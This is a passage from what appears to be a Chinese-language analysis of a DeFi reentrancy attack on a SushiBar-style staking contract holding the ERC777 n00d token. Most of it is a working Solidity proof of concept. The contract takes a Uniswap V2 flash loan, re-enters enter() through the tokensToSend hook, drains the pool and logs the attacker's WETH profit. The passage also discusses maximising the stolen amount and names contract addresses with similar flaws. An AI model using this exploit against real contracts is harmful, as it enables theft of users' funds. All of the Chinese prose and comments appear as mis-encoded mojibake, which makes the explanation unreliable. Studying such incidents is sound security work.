            pair.swap(n00dReserve - 1, 0, address(this), data); //è¿›è¡Œé—ªç”µè´·ï¼Œä¼šæ¥åˆ°è‡ªå®šä¹‰çš„uniswapV2Callå‡½æ•°æ‰§è¡Œ
            uint amountIn = n00d.balanceOf(address(this));
            (uint n00dR, uint WETHR, ) = pair.getReserves();
            uint amountOut = amountIn * 997 * WETHR / (amountIn * 997 + n00dR * 1000);
            n00d.transfer(address(pair), amountIn);
            pair.swap(0, amountOut, address(this), "");
            emit log_named_decimal_uint(
                "Attacker WETH profit after exploit",
                WETH.balanceOf(address(this)),
                18
            );
        }

    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{
        enterAmount = (n00d.balanceOf(address(this))-1) / 4; // æ”»å‡»è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ˜¯4,å› ä¸ºå…±æ‰§è¡Œäº†3æ¬¡enter,éœ€è¦ç”¨åˆ°3ä»½èµ„é‡‘,è¿™é‡Œå°±æ¯”3å¤šåˆ†äº†ä¸€ä»½ã€‚

        // enterçš„è®¡ç®—æ–¹å¼: uint barSwapCount = enterAmount.mul(bar.totalSupply()).div(n00d.balanceOf(BARADDR));
        bar.enter(enterAmount);
        // leaveçš„è®¡ç®—æ–¹å¼: _share.mul(sushi.balanceOf(address(this))).div(totalShares);
        // uint n00dSwapCount = (bar.balanceOf(address(this)).mul(n00d.balanceOf(BARADDR))).div(bar.totalSupply());

        bar.leave(bar.balanceOf(address(this)));

        uint flashReAmount = n00dReserve * 1000 / 997 + 1;
        n00d.transfer(address(pair), flashReAmount); //å½’è¿˜é—ªç”µè´·æœ¬æ¯
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if(to == address(bar) && curCountPerAttack < RECOUNT_PER_ATTACK){ // æ”»å‡»è€…æ‰§è¡Œäº†2æ¬¡
            curCountPerAttack++;
            bar.enter(enterAmount);
        }
    }


    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {}

}
```

# æ€è€ƒ

## 1.å¦‚ä½•åˆ©ç›Šæœ€å¤§åŒ–

é‚£ä¹ˆæ€è€ƒä¸€ä¸ªé—®é¢˜ï¼šæ˜¯ä¸æ˜¯å…±æ”»å‡» 4 æ¬¡ï¼Œæ¯æ¬¡æ‰§è¡Œ 2 æ¬¡é‡å…¥å°±èƒ½åˆ©ç›Šæœ€å¤§åŒ–å‘¢ï¼Ÿ
ä¸æ˜¯çš„ã€‚
å¯ä»¥è¯•éªŒï¼Œå¦‚æœå…±æ”»å‡» 3 æ¬¡ï¼Œæ¯æ¬¡æ‰§è¡Œ 3 æ¬¡é‡å…¥æ—¶ï¼Œèƒ½è·å¾—çš„æ”¶ç›Š(21ETH)æ¯”å®é™…æ”»å‡»è¿‡ç¨‹çš„æ”¶ç›Š(20.82ETH)æ›´å¤§ä¸€ç‚¹ï¼Œä½†æ•´ä¸ªæ± å­åŸºæœ¬ä¹Ÿå°±æ˜¯è¿™ä¹ˆå¤§çš„ä¸€ä¸ªç›ˆåˆ©äº†ï¼Œä¸èƒ½é«˜å‡ºå¤ªå¤šäº†ã€‚
é‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•èƒ½æŠŠæå–å‡ºçš„å¸æ›´é«˜ä¸€äº›å‘¢ï¼Ÿè¿™å°±æ¶‰åŠåˆ° uniswapV2 åˆçº¦çš„è®¡ç®—äº†ã€‚
**uniswap çš„æ± å­ä¸­æœ€å¤šå¯ä»¥å–å‡ºå¤šå°‘ï¼Ÿ**
æ ¹æ® routerV2 åˆçº¦ä¸­çš„ getAmountOut çš„è®¡ç®—å‡½æ•°çš„ä»£ç ã€‚

```
function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(997);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(1000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }
```

å‡è®¾æ˜¯ç”¨ A å…‘æ¢ Bï¼ŒgetAmountOut æ˜¯ç”¨æ¥è®¡ç®—ä½¿ç”¨ amountIn ä¸ª A æœ€ç»ˆèƒ½å…‘æ¢å‡ºçš„ B çš„æ•°é‡ã€‚
å‡½æ•°çš„è¾“å…¥è¾“å…¥:
amountIn: ç”¨æ¥å…‘æ¢çš„ A çš„æ•°é‡ï¼Œå‡è®¾ä¸º xã€‚
reserveInï¼šA çš„ reserve å‚¨å¤‡é‡ï¼Œå‡è®¾ä¸º Xã€‚
reserveOutï¼šB çš„ reserve å‚¨å¤‡é‡ï¼Œå‡è®¾ä¸º Yã€‚
è®¡ç®—å…¬å¼ä¸ºï¼š
![image.png](https://cdn.nlark.com/yuque/0/2023/png/97322/1695872909336-2b5b2144-5dbe-46a2-9c59-0445f245767c.png#averageHue=%23ededed&clientId=uc65f94e3-75ad-4&from=paste&height=37&id=u49928b71&originHeight=74&originWidth=486&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9665&status=done&style=none&taskId=u9bb7bc77-7d33-41ce-9fe6-070a704ed19&title=&width=243)
æ ¹æ®è¿™ä¸ªå…¬å¼ï¼Œæ°¸è¿œä¸å¯èƒ½æŠŠ Y å…¨éƒ¨å–å‡ºæ¥ï¼Œä½†ä¼šè¶Šæ¥è¶Šæ¥è¿‘ Y çš„å‚¨å¤‡é‡ã€‚å¦‚æœåˆ†å¤šæ¬¡å–çš„è¯ï¼Œåé¢å–æ—¶ï¼ŒY çš„æ•°é‡ä¼šèµ·æ¥è¶Šå°‘ï¼ŒY çš„ä»·æ ¼å°±ä¼šè¶Šæ¥è¶Šé«˜ï¼ŒåŒæ · X å–å‡ºçš„ Y å°±ä¼šè¶Šæ¥è¶Šå°‘ï¼Œæ‰€ä»¥è¶Šåˆ°æœ€åï¼Œå–å‡º Y æ‰€éœ€è¦çš„ X èµ·æ¥è¶Šå¤šã€‚
æ‰€ä»¥ï¼Œå›åˆ°è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•èƒ½æŠŠæå–å‡ºçš„å¸æ›´é«˜ä¸€äº›å‘¢ï¼Ÿæœ‰çš„ï¼Œæ”»å‡»æ—¶åªæ˜¯ä» 0x5476DB8B72337d44A6724277083b1a927c82a389 çš„ pair åˆçº¦ä¸­å€Ÿå‡º n00d æ¥è¿›è¡Œæ”»å‡»ï¼Œå¦‚æœå¯ä»¥ä»æ›´å¤šçš„åœ°æ–¹æƒ³åŠæ³•å€Ÿæ›´å¤šçš„ n00d ä»£å¸ï¼Œå¯èƒ½ä¼šä½¿å–å‡ºçš„å¸æ•°é‡åˆ—å¤šã€‚

## 2.è¿˜æœ‰å“ªäº›æœ‰ç±»ä¼¼æ¼æ´çš„ä»£ç 

ä¸‹é¢çš„ä»£ç ä¸­ä¹Ÿæœ‰ç±»ä¼¼çš„é—®é¢˜ï¼Œä½†å› ä¸ºå¯¹åº”çš„ n00d åˆçº¦ä½¿ç”¨çš„æ˜¯ ERC20,å¹¶é REC777,å› æ­¤å³ä½¿æœ‰é‡å…¥çš„é£é™©ï¼Œä½†æ²¡æ³•åˆ©ç”¨ã€‚
0x36b679bd64ed73dbfd88909cdcb892cb66bd4cbb Standard
0x8798249c2e607446efb7ad49ec89dd1865ff4272 SushiBar
